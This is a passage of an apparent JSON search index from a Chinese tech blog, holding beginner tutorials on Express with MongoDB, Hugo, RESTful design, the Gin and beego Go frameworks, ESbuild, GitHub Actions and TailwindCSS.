名称","title":"Nestjs学习笔记"},{"content":"Express是基于nodejs的web应用框架（同时也是node的第三库），同时也是很多web应用框架的底层库，Express是cjs模块标准的http服务框架\n安装\nnpm install express \u0026ndash;save\n或者安装express-generator脚手架\nnpm install -g express-generator\n脚手架：\n初始化项目（demo是项目名）\nexpress demo\n安装依赖\nnpm install\n运行\nnpm start\n如果不使用脚手架（main.js）\nconst express = require(\u0026quot;express\u0026quot;)\rconst app = express()\rapp.get('/',function(req,res){ res.end(\u0026quot;hallo world!\u0026quot;)\r})\rapp.listen(3000)\r运行\nnode main.js\n或者（监视nodejs应用中的任何更改并自动重启服务）\nnodemon main.js\n访问localhost:3000\n静态文件管理（必须通过/src才能访问src文件夹的静态文件）\napp.use(\u0026rsquo;/src\u0026rsquo;,express.static(\u0026lsquo;src\u0026rsquo;))\n解决跨域问题（依赖于cors模块）\napp.use(require(\u0026lsquo;cors\u0026rsquo;)())\nExpress连接MongoDB（mongoose）\nnpm install mongoose\nconst mongoose = require('mongoose')\rmongoose.connect('mongodb://localhost:27014/test',{useNewUrlParser: true})\rconst testdb = mongoose.model('testdb',new mongoose.Schema({\r_id: Number,\rtitle: String\r}))\r/*testdb.inserMany([\r{_id: 1, title: \u0026quot;abc\u0026quot;},\r{_id: 2, title: \u0026quot;xyz\u0026quot;}\r{_id: 3, title: \u0026quot;abcxyz\u0026quot;}\r])*/\rapp.get('/test',async function(req,res){\rres.send(await testdb.find())\r})\r查询MongoDB数据\napp.get('/test',async function(req,res){\r// const data = await testdb.find().skip(1).limit(2)\r/* const data = await testdb.find().where({\rtitle: 'abc'\r*/\rconst data = await testdb.find().sort({\r_id: -1\r})\rres.send(data)\r})\rskip(1)跳过多少条，limit(2)显示多少条，where()可指定查询某个字段为某个值的数据，sort()表示排序的顺序（1为正序，-1为倒序）\napp.get('/test/:id',async function(req,res){\rconst data = await testdb.findById(req.params.id)\rres.send(data)\r})\r访问localhost:3000/test/2\n注意：req和res的区别，req是客户端请求，res是服务端响应\n插入数据到MongoDB中\napp.use(express.json()) // 通过express.json()中间件，解析body中的json数据\rapp.post('/admin' async function(req,res){\rconst data = req.body // 获取前端post请求的body数据\rconst dataMain = await testdb.create(data) // body数据create到MongoDB数据库中\rres.send(dataMain)\r})\r修改MongoDB数据\napp.put('/admin/:id' async function(req,res){\rconst data = await testdb.findById(req.params.id) // 寻找目标id\rdata.title = req.body.title // 将请求body的title赋值到数据库中的目标id的title\rawait data.save() // 保存到数据库中\rres.send(data)\r})\r删除MongoDB数据\napp.delete('/admin/:id' async function(req,res){\rconst data = await testdb.findById(req.params.id) // 寻找目标id\rawait data.remove() // 从数据库中删除该数据\rres.send({\rcode: 200\r})\r})\r","permalink":"https://99999.fun/posts/138/","summary":"Express是基于nodejs的web应用框架（同时也是node的第三库），同时也是很多web应用框架的底层库，Express是cjs模块标准的http服务框架\n安装\nnpm install express \u0026ndash;save\n或者安装express-generator脚手架\nnpm install -g express-generator\n脚手架：\n初始化项目（demo是项目名）\nexpress demo\n安装依赖\nnpm install\n运行\nnpm start\n如果不使用脚手架（main.js）\nconst express = require(\u0026quot;express\u0026quot;)\rconst app = express()\rapp.get('/',function(req,res){ res.end(\u0026quot;hallo world!\u0026quot;)\r})\rapp.listen(3000)\r运行\nnode main.js\n或者（监视nodejs应用中的任何更改并自动重启服务）\nnodemon main.js\n访问localhost:3000\n静态文件管理（必须通过/src才能访问src文件夹的静态文件）\napp.use(\u0026rsquo;/src\u0026rsquo;,express.static(\u0026lsquo;src\u0026rsquo;))\n解决跨域问题（依赖于cors模块）\napp.use(require(\u0026lsquo;cors\u0026rsquo;)())\nExpress连接MongoDB（mongoose）\nnpm install mongoose\nconst mongoose = require('mongoose')\rmongoose.connect('mongodb://localhost:27014/test',{useNewUrlParser: true})\rconst testdb = mongoose.model('testdb',new mongoose.Schema({\r_id: Number,\rtitle: String\r}))\r/*testdb.inserMany([\r{_id: 1, title: \u0026quot;abc\u0026quot;},\r{_id: 2, title: \u0026quot;xyz\u0026quot;}\r{_id: 3, title: \u0026quot;abcxyz\u0026quot;}\r])*/\rapp.","title":"简单使用Express-Web应用框架"},{"content":"Hugo是基于Go语言开发的静态网站生成器，特点就是快\n安装\n二进制文件安装（由官方编译完成的二进制文件来安装，推荐使用，用源码容易出现问题）\nhttps://github.com/gohugoio/hugo/releases\n源码安装\ngit clone https://github.com/gohugoio/hugo.git\ncd hugo\ngo install\n检查是否安装完成 hugo -v，如果需要支持SASS/SCSS，请添加\u0026ndash;tags extended参数，不过在这之前需要CGO的依赖（或者使用hugo_extended版本）\n如果没安装CGO，请先安装CGO，这里使用的是mingw64，CGO_ENABLED环境变量为1\n生成站点\nhugo new site ./www\n创建文章（默认自动生成md文件到content文件夹中，可选择目录）\nhugo new post/hallo.md\n如果没有显示文章的话，请将文章的draft字段改为false，因为这个是草稿，草稿是不会显示在页面上的\n安装主题\ngit clone https://github.com/miiiku/hugo-theme-kagome.git ./themes/kagome\n修改config.toml文件\nbaseURL = \u0026lsquo;https://blog.xiaochenabc123.test.com\u0026rsquo; languageCode = \u0026lsquo;zh-CN\u0026rsquo; title = \u0026lsquo;小陈的博客\u0026rsquo; theme = \u0026ldquo;kagome\u0026rdquo;\n启动Hugo服务器\nhugo server\n访问http://localhost:1313\n如果报错，you need the extended version to build SCSS/SASS的话，请使用extended版本\n部署到github pages\nhugo\n如果该命令执行成功，会将静态页面生成到public文件夹中，只需要push该文件夹到github上就好了\n","permalink":"https://99999.fun/posts/137/","summary":"Hugo是基于Go语言开发的静态网站生成器，特点就是快\n安装\n二进制文件安装（由官方编译完成的二进制文件来安装，推荐使用，用源码容易出现问题）\nhttps://github.com/gohugoio/hugo/releases\n源码安装\ngit clone https://github.com/gohugoio/hugo.git\ncd hugo\ngo install\n检查是否安装完成 hugo -v，如果需要支持SASS/SCSS，请添加\u0026ndash;tags extended参数，不过在这之前需要CGO的依赖（或者使用hugo_extended版本）\n如果没安装CGO，请先安装CGO，这里使用的是mingw64，CGO_ENABLED环境变量为1\n生成站点\nhugo new site ./www\n创建文章（默认自动生成md文件到content文件夹中，可选择目录）\nhugo new post/hallo.md\n如果没有显示文章的话，请将文章的draft字段改为false，因为这个是草稿，草稿是不会显示在页面上的\n安装主题\ngit clone https://github.com/miiiku/hugo-theme-kagome.git ./themes/kagome\n修改config.toml文件\nbaseURL = \u0026lsquo;https://blog.xiaochenabc123.test.com\u0026rsquo; languageCode = \u0026lsquo;zh-CN\u0026rsquo; title = \u0026lsquo;小陈的博客\u0026rsquo; theme = \u0026ldquo;kagome\u0026rdquo;\n启动Hugo服务器\nhugo server\n访问http://localhost:1313\n如果报错，you need the extended version to build SCSS/SASS的话，请使用extended版本\n部署到github pages\nhugo\n如果该命令执行成功，会将静态页面生成到public文件夹中，只需要push该文件夹到github上就好了","title":"简单使用Hugo搭建网站"},{"content":"RESTful是指满足REST的约束条件和原则的应用或者设计，REST全称Representational State Transfer（表现层状态转移），REST出现在2000年Roy Fielding的博士论文中（Roy Fielding是HTTP规范的主要编写者之一），RESTful是目前最流行的API设计规范\n资源(Resources)：REST是基于资源的，不同的资源使用不同且唯一的URI(统一资源标识符（Uniform Resource Identifier），URI格式例如：/img/hallo.jpg，可表示一个资源的路径和资源名称，URI实质上就是URL加URN)表示，获取资源通过访问URI得到，这个资源可以是任何东西（例如txt，exe，iso，mp3，mp4等等）\n表示层(Representation)：表示层指是将资源具体内容以某种方式展现出来的，例如hallo.mp3，那么就会用mp3的格式来展现这个文件的内容\n状态转换(State Transfer)：如果希望客户端通过某种请求方式来让服务端表示层的资源发生改变，这就是状态转换，这请求方式分别为GET（获取资源），POST（新建资源），PUT（更新资源），DELETE（删除资源）\nRESTful设计规范的六个规范：\n1.客户端/服务端(C/S)关注点分离，客户端专注于用户的操作界面，服务端专注于数据存储\n2.无状态，要求客户端的每个请求都要拥有完成请求的全部信息，服务端不用存储任何上下文信息，会话信息存储在客户端上\n3.统一接口（Uniform Interface），要求使用具备REST规范（资源标识符，资源状态的修改，具备描述资源怎么操作处理的信息，客户端应使用超链接的方式来动态访问其他资源）的接口\n4.可缓存（Cache），允许服务端响应可被缓存或者不可缓存（必须明确是否可缓存），如果响应可缓存，客户端可以根据有效缓存时间，来复用响应，减少前后端交互\n5.分层系统，不允许跨层访问（访问不相邻的层）\n6.按需编码（可选，可理解为按需扩展客户端功能），允许服务端提供一些脚本来扩展客户端功能（例如JavaScript）\napi接口统一域名（推荐使用api.xiaochenabc123.test.com这样的格式）\nURI（不使用大写，使用中杆-，资源名字是复数名词，资源实体集合，不能出现动词）\nHTTP请求方式（不同的操作使用不同的请求方式，例如获取资源使用get，post新建资源等等）\n如果资源庞大，可通过get参数的形式获取（例如分页），API的版本号应该放在URI中，更改资源，应该修改资源版本号，原有的URI应该保持继续可用\n需正确设置http状态码，根据http状态码来做出不同的响应，例如200正常返回，404文件不存在等等\n简单来说就是使用唯一接口，通过URL来访问不同的资源，通过不同的请求方式对资源做出响应\n","permalink":"https://99999.fun/posts/136/","summary":"RESTful是指满足REST的约束条件和原则的应用或者设计，REST全称Representational State Transfer（表现层状态转移），REST出现在2000年Roy Fielding的博士论文中（Roy Fielding是HTTP规范的主要编写者之一），RESTful是目前最流行的API设计规范\n资源(Resources)：REST是基于资源的，不同的资源使用不同且唯一的URI(统一资源标识符（Uniform Resource Identifier），URI格式例如：/img/hallo.jpg，可表示一个资源的路径和资源名称，URI实质上就是URL加URN)表示，获取资源通过访问URI得到，这个资源可以是任何东西（例如txt，exe，iso，mp3，mp4等等）\n表示层(Representation)：表示层指是将资源具体内容以某种方式展现出来的，例如hallo.mp3，那么就会用mp3的格式来展现这个文件的内容\n状态转换(State Transfer)：如果希望客户端通过某种请求方式来让服务端表示层的资源发生改变，这就是状态转换，这请求方式分别为GET（获取资源），POST（新建资源），PUT（更新资源），DELETE（删除资源）\nRESTful设计规范的六个规范：\n1.客户端/服务端(C/S)关注点分离，客户端专注于用户的操作界面，服务端专注于数据存储\n2.无状态，要求客户端的每个请求都要拥有完成请求的全部信息，服务端不用存储任何上下文信息，会话信息存储在客户端上\n3.统一接口（Uniform Interface），要求使用具备REST规范（资源标识符，资源状态的修改，具备描述资源怎么操作处理的信息，客户端应使用超链接的方式来动态访问其他资源）的接口\n4.可缓存（Cache），允许服务端响应可被缓存或者不可缓存（必须明确是否可缓存），如果响应可缓存，客户端可以根据有效缓存时间，来复用响应，减少前后端交互\n5.分层系统，不允许跨层访问（访问不相邻的层）\n6.按需编码（可选，可理解为按需扩展客户端功能），允许服务端提供一些脚本来扩展客户端功能（例如JavaScript）\napi接口统一域名（推荐使用api.xiaochenabc123.test.com这样的格式）\nURI（不使用大写，使用中杆-，资源名字是复数名词，资源实体集合，不能出现动词）\nHTTP请求方式（不同的操作使用不同的请求方式，例如获取资源使用get，post新建资源等等）\n如果资源庞大，可通过get参数的形式获取（例如分页），API的版本号应该放在URI中，更改资源，应该修改资源版本号，原有的URI应该保持继续可用\n需正确设置http状态码，根据http状态码来做出不同的响应，例如200正常返回，404文件不存在等等\n简单来说就是使用唯一接口，通过URL来访问不同的资源，通过不同的请求方式对资源做出响应","title":"简单了解RESTful设计规范"},{"content":"Gin是一个基于go语言编写的web框架，因为Gin的路由库基于httprouter开发的，性能非常好，支持Restful api规范\n安装\ngo get -u github.com/gin-gonic/gin\n第一个demo\npackage main\rimport \u0026quot;github.com/gin-gonic/gin\u0026quot;\rimport \u0026quot;net/http\u0026quot;\rfunc main() {\rg := gin.Default()\rg.GET(\u0026quot;/\u0026quot;, func(c *gin.Context) {\rc.String(http.StatusOK, \u0026quot;hallo word\u0026quot;)\r})\rg.Run()\r}\rgo run main.go\ng.Run()是将应用部署到本地服务器上，默认端口为8080，可设置端口，g.Run(\u0026quot;:2333\u0026quot;)\n路由\nr.GET(\u0026quot;/test/:name\u0026quot;, func(c *gin.Context) {\rname := c.Param(\u0026quot;name\u0026quot;)\rc.String(http.StatusOK, name)\r})\rg.Run(\u0026quot;:6666\u0026quot;)\r127.0.0.1:6666/test/xiaochen\n可以看到Context的Param方法可以获取路由的参数\n通过url传递参数\nr.GET(\u0026quot;/test\u0026quot;, func(c *gin.Context) {\rname := c.DefaultQuery(\u0026quot;name\u0026quot;, \u0026quot;test\u0026quot;)\rc.String(http.StatusOK, fmt.Sprintf(\u0026quot;hallo %s\u0026quot;, name))\r})\rr.Run()\r127.0.0.1:6666/test\n如果没有传递参数将会输出DefaultQuery的默认参数test\n传递参数后 127.0.0.1:6666/test?name=word\nPOST请求\nindex.html main.go\nr.POST(\u0026quot;/form\u0026quot;, func(c *gin.Context) {\rtypes := c.DefaultPostForm(\u0026quot;type\u0026quot;, \u0026quot;post\u0026quot;)\ruser := c.PostForm(\u0026quot;user\u0026quot;)\rpass := c.PostForm(\u0026quot;pass\u0026quot;)\rc.String(http.StatusOK, fmt.Sprintf(\u0026quot;user:%s,pass:%s,type:%s\u0026quot;, name, pass, types))\r})\rr.Run()\r","permalink":"https://99999.fun/posts/135/","summary":"Gin是一个基于go语言编写的web框架，因为Gin的路由库基于httprouter开发的，性能非常好，支持Restful api规范\n安装\ngo get -u github.com/gin-gonic/gin\n第一个demo\npackage main\rimport \u0026quot;github.com/gin-gonic/gin\u0026quot;\rimport \u0026quot;net/http\u0026quot;\rfunc main() {\rg := gin.Default()\rg.GET(\u0026quot;/\u0026quot;, func(c *gin.Context) {\rc.String(http.StatusOK, \u0026quot;hallo word\u0026quot;)\r})\rg.Run()\r}\rgo run main.go\ng.Run()是将应用部署到本地服务器上，默认端口为8080，可设置端口，g.Run(\u0026quot;:2333\u0026quot;)\n路由\nr.GET(\u0026quot;/test/:name\u0026quot;, func(c *gin.Context) {\rname := c.Param(\u0026quot;name\u0026quot;)\rc.String(http.StatusOK, name)\r})\rg.Run(\u0026quot;:6666\u0026quot;)\r127.0.0.1:6666/test/xiaochen\n可以看到Context的Param方法可以获取路由的参数\n通过url传递参数\nr.GET(\u0026quot;/test\u0026quot;, func(c *gin.Context) {\rname := c.DefaultQuery(\u0026quot;name\u0026quot;, \u0026quot;test\u0026quot;)\rc.String(http.StatusOK, fmt.Sprintf(\u0026quot;hallo %s\u0026quot;, name))\r})\rr.Run()\r127.0.0.1:6666/test\n如果没有传递参数将会输出DefaultQuery的默认参数test\n传递参数后 127.0.0.1:6666/test?name=word\nPOST请求\nindex.html main.go","title":"Gin框架学习笔记"},{"content":"beego是一个基于go语言开发的http框架，beego可用于开发web，api，后端服务等等应用，beego架构为mvc模型，支持RESTful api规范设计，支持热更新\n安装\ngo get github.com/beego/beego\ngo get github.com/beego/bee\n检查是否安装完成\nbee version\nbeego项目可使用bee指令来创建和管理\n创建第一个web应用\nbee new hallo\nbeego是基于mvc模型的，因此其构建出来的项目文件也是标准mvc模型文件结构，其中main.go是入口文件\n执行go mod tidy，生成go.sum\n启动项目（bee run指令会自动编译部署）\nbee run\n访问http://127.0.0.1:8080/\n其他常用beeg指令\n创建api应用\nbee api apitest\n打包应用命令（将项目打包压缩）\nbee pack\n自动生成代码\nbee generate\ncontroller控制器\n简单接收一下get请求的参数\ncontrollers/default.go，在func (c *MainController) Get() 函数中修改\nname := c.GetString(\u0026quot;name\u0026quot;)\rc.Data[\u0026quot;Website\u0026quot;] = name\r访问http://127.0.0.1:8080/?name=hallo，views\\index.tpl的模板中的{{.Website}}被设置为hallo\n在controllers/default.go看到，其定义了一个MainController结构体，该结构体继承了beego.Controller的全部方法（其中方法包括Get，Post等等方法）\nModel模型\n在bee new中并没有Model实例演示，但是bee api有，而且controller控制器可完成一些简单逻辑，只有当逻辑需要复用时才抽象成Model模型\nView视图\n在controllers/default.go看到c.TplName = \u0026ldquo;index.tpl\u0026rdquo;，这个语句就是设置模板文件，该模板支持tpl和html文件，beego使用了golang默认的模板引擎\n在views/index.tpl中可以看到这个\n\u0026lt;div class=\u0026quot;author\u0026quot;\u0026gt;\rOfficial website:\r\u0026lt;a href=\u0026quot;http://{{.Website}}\u0026quot;\u0026gt;{{.Website}}\u0026lt;/a\u0026gt; /\rContact me:\r\u0026lt;a class=\u0026quot;email\u0026quot; href=\u0026quot;mailto:{{.Email}}\u0026quot;\u0026gt;{{.Email}}\u0026lt;/a\u0026gt;\r\u0026lt;/div\u0026gt;\r在controller中，定义了数据，并且该数据赋值给Data，在模板文件中通过{{.Email}}来访问到数据\n数据库交互\nbee generate scaffold test -fields=\u0026ldquo;id:int64,name:string\u0026rdquo; -driver=mysql -conn=\u0026ldquo;root:root@tcp(127.0.0.1:3306)/test\u0026rdquo;\n上面这个命令会自动生成代码，其中-fields参数为字段，-driver为引擎，-conn为数据库登录信息\n如果没有打错指令，会提示是否创建mvc模型的文件，根据提示选择是否要创建\n在models下的test.go文件，可以看到已经添加了管理数据库的函数\n静态文件的引用\nbeego默认使用static目录作为静态文件的目录，在main.go文件中beego.Run()之前配置StaticDir[\u0026quot;/static\u0026quot;] = \u0026ldquo;static\u0026rdquo;\n如果有多个静态文件目录，可使用beego.SetStaticPath(\u0026quot;/test\u0026quot;, \u0026ldquo;test\u0026rdquo;)\n","permalink":"https://99999.fun/posts/134/","summary":"beego是一个基于go语言开发的http框架，beego可用于开发web，api，后端服务等等应用，beego架构为mvc模型，支持RESTful api规范设计，支持热更新\n安装\ngo get github.com/beego/beego\ngo get github.com/beego/bee\n检查是否安装完成\nbee version\nbeego项目可使用bee指令来创建和管理\n创建第一个web应用\nbee new hallo\nbeego是基于mvc模型的，因此其构建出来的项目文件也是标准mvc模型文件结构，其中main.go是入口文件\n执行go mod tidy，生成go.sum\n启动项目（bee run指令会自动编译部署）\nbee run\n访问http://127.0.0.1:8080/\n其他常用beeg指令\n创建api应用\nbee api apitest\n打包应用命令（将项目打包压缩）\nbee pack\n自动生成代码\nbee generate\ncontroller控制器\n简单接收一下get请求的参数\ncontrollers/default.go，在func (c *MainController) Get() 函数中修改\nname := c.GetString(\u0026quot;name\u0026quot;)\rc.Data[\u0026quot;Website\u0026quot;] = name\r访问http://127.0.0.1:8080/?name=hallo，views\\index.tpl的模板中的{{.Website}}被设置为hallo\n在controllers/default.go看到，其定义了一个MainController结构体，该结构体继承了beego.Controller的全部方法（其中方法包括Get，Post等等方法）\nModel模型\n在bee new中并没有Model实例演示，但是bee api有，而且controller控制器可完成一些简单逻辑，只有当逻辑需要复用时才抽象成Model模型\nView视图\n在controllers/default.go看到c.TplName = \u0026ldquo;index.tpl\u0026rdquo;，这个语句就是设置模板文件，该模板支持tpl和html文件，beego使用了golang默认的模板引擎\n在views/index.tpl中可以看到这个\n\u0026lt;div class=\u0026quot;author\u0026quot;\u0026gt;\rOfficial website:\r\u0026lt;a href=\u0026quot;http://{{.Website}}\u0026quot;\u0026gt;{{.Website}}\u0026lt;/a\u0026gt; /\rContact me:\r\u0026lt;a class=\u0026quot;email\u0026quot; href=\u0026quot;mailto:{{.","title":"beego应用框架的简单使用"},{"content":"ESbuild打包器基于Golang开发，优点在于可多线程打包，直接编译成机器码，ESbuild提供的api可在JavaScript和golang使用，连Vite在很多场景都依赖了ESbuild打包（viet在开发环境下使用这个），支持TypeScript和jsx（tsx），css\nESbuild支持ES6模块，cjs模块，对ES6+语法支持性好，可以直接打包css文件，json文件，ts文件\n注意：esbuild并不对ts文件进行类型检查工作\n安装\nnpm install esbuild\n或者\nyarn add esbuild\n打包\n.\\node_modules.bin\\esbuild app.jsx \u0026ndash;outfile=build/index.js \u0026ndash;bundle\n或者\nnpx esbuild app.jsx \u0026ndash;outfile=build/index.js \u0026ndash;bundle\n或者package.json\n\u0026ldquo;build\u0026rdquo;: \u0026ldquo;esbuild app.jsx \u0026ndash;outfile=build/index.js \u0026ndash;bundle\u0026rdquo;\nnpm run build\n或者\nyarn build\n例子（app.jsx）\nimport React from 'react'\rimport ReactDOM from 'react-dom'\rconst App = () =\u0026gt; {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Hallo, Esbuild!\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\rReactDOM.render(\r\u0026lt;App /\u0026gt;,\rdocument.getElementById(\u0026quot;app\u0026quot;)\r)\rindex.html\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\r\u0026lt;script src=\u0026quot;./build/index.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\r我本地打包只花64ms就打包好了\n使用source map功能\nnpx esbuild app.jsx \u0026ndash;outfile=build/index.js \u0026ndash;bundle \u0026ndash;sourcemap\n使用代码压缩功能\u0026ndash;minify\nnpx esbuild app.jsx \u0026ndash;outfile=build/index.js \u0026ndash;bundle \u0026ndash;minify\n指定打包目标环境\nnpx esbuild app.jsx \u0026ndash;outfile=build/index.js \u0026ndash;bundle \u0026ndash;target=es2020,node12\n注意：如果将ES6+语法编译成ES5语法是不被支持的，但是可以将ES5语法编译成ES6+的语法或者ES6语法升级为更先进的语法，也可以将ES6+语法降到ES6语法，就是不能降到ES5（估计这是为啥vite选择这个作为开发环境打包工具，而不是生产环境打包工具的原因吧，只有开发环境下，默认认为是现代浏览器（node）环境下工作的）\n指定输出目标\nnpx esbuild app.jsx \u0026ndash;outfile=build/index.js \u0026ndash;bundle \u0026ndash;target=es2020,node12 \u0026ndash;platform=node\n\u0026ndash;platform有3个值，分别是browser，node，neutral\n默认情况下使用browser值，会将打包的代码放到IIFE（立即执行函数）中，并且对package.json依赖做出修改，会使用对目标友好的插件或者包来代替原来的\n设置为node时，打包格式是cjs格式（CommonJS），会将其他风格转换为cjs格式\n设置为neutral时，打包格式为esm格式\n指定不进行打包构建的模块\nnpx esbuild app.jsx \u0026ndash;outfile=build/index.js \u0026ndash;bundle \u0026ndash;platform=node \u0026ndash;external:react\nesbuild.config.js，api调用文件\nconst postCssPlugin = require('@deanc/esbuild-plugin-postcss')\rconst autoprefixer = require('autoprefixer')\rconst esbuildConig = () =\u0026gt; require('esbuild').buildSync({\rentryPoints: ['src/app.jsx'],\rbundle: true,\rtarget: ['es2020','node12'],\rexternal: ['react'],\rloader: {'.jpg':'dataurl','.js':'jsx'},\rplatform: 'node',\routfile: 'build/index.js',\rplugins: [\rpostCssPlugin({\rplugins: [autoprefixer]\r})\r],\r})\resbuildConig()\r通过执行node ./esbuild.config.js，来调用ESbuild API快速打包 当然也是可以使用npm script来设置\n\u0026quot;scripts\u0026quot;: {\r\u0026quot;build\u0026quot;: \u0026quot;node ./esbuild.config.js\u0026quot;\r}\rnpm run build\n或者\nyarn build\n添加图片支持（通过转换成base64的方法来引用）\nnpx esbuild app.jsx \u0026ndash;outfile=build/index.js \u0026ndash;bundle \u0026ndash;loader:.jpg=dataurl\n添加tsx支持（可以把tsx文件转换为普通的js文件）\nnpx esbuild app.tsx \u0026ndash;outfile=build/index.js \u0026ndash;bundle \u0026ndash;loader:.js=jsx\nesbuild社区插件库：https://github.com/esbuild/community-plugins\n","permalink":"https://99999.fun/posts/132/","summary":"ESbuild打包器基于Golang开发，优点在于可多线程打包，直接编译成机器码，ESbuild提供的api可在JavaScript和golang使用，连Vite在很多场景都依赖了ESbuild打包（viet在开发环境下使用这个），支持TypeScript和jsx（tsx），css\nESbuild支持ES6模块，cjs模块，对ES6+语法支持性好，可以直接打包css文件，json文件，ts文件\n注意：esbuild并不对ts文件进行类型检查工作\n安装\nnpm install esbuild\n或者\nyarn add esbuild\n打包\n.\\node_modules.bin\\esbuild app.jsx \u0026ndash;outfile=build/index.js \u0026ndash;bundle\n或者\nnpx esbuild app.jsx \u0026ndash;outfile=build/index.js \u0026ndash;bundle\n或者package.json\n\u0026ldquo;build\u0026rdquo;: \u0026ldquo;esbuild app.jsx \u0026ndash;outfile=build/index.js \u0026ndash;bundle\u0026rdquo;\nnpm run build\n或者\nyarn build\n例子（app.jsx）\nimport React from 'react'\rimport ReactDOM from 'react-dom'\rconst App = () =\u0026gt; {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Hallo, Esbuild!\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\rReactDOM.render(\r\u0026lt;App /\u0026gt;,\rdocument.getElementById(\u0026quot;app\u0026quot;)\r)\rindex.html\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\r\u0026lt;script src=\u0026quot;./build/index.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\r我本地打包只花64ms就打包好了\n使用source map功能","title":"简单使用ESbuild打包工具"},{"content":"CI：持续集成 (Continuous Integration) CD：持续交付 (Continuous Delivery) CD：持续部署 (Continuous Deployment)\nGitHub Actions是GitHub提供的持续集成服务\nGitHub Actions官方文档：https://docs.github.com/en/actions\nworkflow：工作流程，指一次持续集成的流程，由一个job或者多个job组成 Events：事件，触发流程的钩子（在github中事件为检测仓库特定活动的钩子，例如pull，当事件被触发则自动执行工作流程） Job：任务，任务是工作流程的主体 Steps：步骤，每个Job可以包含一个或多个Step Actions: 行为，每个Step包含一个或多个Action Runners: 执行环境，工作流程运行时的服务端，每一个执行环境可以运行一个任务\nworkflow工作流程通过编写workflow文件来描述，workflow文件要使用YAML语言编写，github支持多个workflow（当github发现.github/workflows/目录下有.yml文件时就会执行该文件）\n在仓库的.github/workflows/目录下创建test.yml，其中要配置字段\nname：workflow名称，如果省略默认为当前workflow的文件名\non：指定触发workflow的条件，一般为事件触发（比如说push）\njobs：每一项任务都需要定义个job_id，job中的name为该任务的描述，needs为指定当前任务的运行顺序（依赖关系），runs-on为指定运行时需要的虚拟机环境（这个字段必须填）\n目前github支持的虚拟机操作系统有ubuntu，windows，macOS，而且github提供的虚拟机是免费使用的\n这里举个例子（github官方的）\nname: GitHub Actions Demo\ron: [push]\rjobs:\rExplore-GitHub-Actions:\rruns-on: ubuntu-latest\rsteps:\r- run: echo \u0026quot; The job was automatically triggered by a ${{ github.event_name }} event.\u0026quot;\r- run: echo \u0026quot; This job is now running on a ${{ runner.os }} server hosted by GitHub!\u0026quot;\r- run: echo \u0026quot; The name of your branch is ${{ github.ref }} and your repository is ${{ github.repository }}.\u0026quot;\r- name: Check out repository code\ruses: actions/checkout@v2\r- run: echo \u0026quot; The ${{ github.repository }} repository has been cloned to the runner.\u0026quot;\r- run: echo \u0026quot; The workflow is now ready to test your code on the runner.\u0026quot;\r- name: List files in the repository\rrun: |\rls ${{ github.workspace }}\r- run: echo \u0026quot; This job's status is ${{ job.status }}.\u0026quot; ","permalink":"https://99999.fun/posts/131/","summary":"CI：持续集成 (Continuous Integration) CD：持续交付 (Continuous Delivery) CD：持续部署 (Continuous Deployment)\nGitHub Actions是GitHub提供的持续集成服务\nGitHub Actions官方文档：https://docs.github.com/en/actions\nworkflow：工作流程，指一次持续集成的流程，由一个job或者多个job组成 Events：事件，触发流程的钩子（在github中事件为检测仓库特定活动的钩子，例如pull，当事件被触发则自动执行工作流程） Job：任务，任务是工作流程的主体 Steps：步骤，每个Job可以包含一个或多个Step Actions: 行为，每个Step包含一个或多个Action Runners: 执行环境，工作流程运行时的服务端，每一个执行环境可以运行一个任务\nworkflow工作流程通过编写workflow文件来描述，workflow文件要使用YAML语言编写，github支持多个workflow（当github发现.github/workflows/目录下有.yml文件时就会执行该文件）\n在仓库的.github/workflows/目录下创建test.yml，其中要配置字段\nname：workflow名称，如果省略默认为当前workflow的文件名\non：指定触发workflow的条件，一般为事件触发（比如说push）\njobs：每一项任务都需要定义个job_id，job中的name为该任务的描述，needs为指定当前任务的运行顺序（依赖关系），runs-on为指定运行时需要的虚拟机环境（这个字段必须填）\n目前github支持的虚拟机操作系统有ubuntu，windows，macOS，而且github提供的虚拟机是免费使用的\n这里举个例子（github官方的）\nname: GitHub Actions Demo\ron: [push]\rjobs:\rExplore-GitHub-Actions:\rruns-on: ubuntu-latest\rsteps:\r- run: echo \u0026quot; The job was automatically triggered by a ${{ github.event_name }} event.\u0026quot;\r- run: echo \u0026quot; This job is now running on a ${{ runner.os }} server hosted by GitHub!","title":"简单使用GitHub Actions来实现CI/CD"},{"content":"TailwindCSS是一个CSS框架，我个人理解这东西就是根据class来生成css（按需），而不是像bootstrap那样，TailwindCSS是原子化的\n安装\nnpm install tailwindcss\n初始化tailwind.config.js\nnpx tailwindcss init\n在tailwind.config.js中content属性，表示着项目的html或者js文件\ncontent: [\r'./src/**/*.{html,js}'\r],\r如果没有配置content属性，会警告\nwarn - The content option in your Tailwind CSS configuration is missing or empty. warn - Configure your content sources or your generated CSS will be missing styles. warn - https://tailwindcss.com/docs/content-configuration\n创建一个css文件配置tailwind三大组件（base，components.utilities）\n@tailwind base;\r@tailwind components;\r@tailwind utilities;\r如果使用的是webpacker或者postcss-import，不能使用@tailwind指令，需要\n@import \u0026quot;tailwindcss/base\u0026quot;;\r@import \u0026quot;tailwindcss/components\u0026quot;;\r@import \u0026quot;tailwindcss/utilities\u0026quot;;\r也可以将css导入到js中\nimport \u0026quot;tailwindcss/tailwind.css\u0026quot;\rtailwind编译\nnpx tailwindcss -i ./src/index.css -o ./dist/main.css\n如果使用的是postcss\npostcss ./src/index.css -o ./dist/main.css\n例如:\n\u0026lt;h1 class=\u0026quot;text-gray-900\u0026quot;\u0026gt;\rhallo word\r\u0026lt;/h1\u0026gt;\r编译后的结果为\n.text-gray-900 {\r--tw-text-opacity: 1;\rcolor: rgb(17 24 39 / var(--tw-text-opacity));\r}\r具体样式根据tailwindcss官方文档为准，https://tailwindcss.com/docs/\n当然也允许自定义，直接配置tailwind.config.js文件就好了（theme属性）\nVisual Studio Code插件Tailwind CSS 